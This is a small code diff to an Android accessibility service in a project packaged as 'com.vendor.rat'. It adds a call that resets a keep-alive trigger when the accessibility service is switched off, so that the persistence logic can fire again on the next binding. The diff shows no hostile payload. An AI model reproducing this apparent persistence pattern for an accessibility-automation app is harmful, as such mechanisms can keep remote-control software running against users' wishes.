@@ -15,6 +15,7 @@ import com.vendor.rat.MainApplication;
 import com.vendor.rat.auto.engine.AutoEngine;
 import com.vendor.rat.auto.entity.UiNode;
 import com.vendor.rat.config.AppConfig;
+import com.vendor.rat.keepalive.thread.StrategyThread;
 
 import java.io.File;
 import java.util.List;
@@ -381,6 +382,9 @@ public class MyAccessibilityService extends AccessibilityService {
             if (MainApplication.getInstance() != null) {
                 Log.d(TAG, "offerStrategyEvent: ACCESSIBILITY_SERVICE_OFF");
             }
+
+            // 重置保活触发标志，允许下次服务绑定时重新触发
+            StrategyThread.resetTrigger();
 
             f219p.set(null);
         } catch (Exception e) {
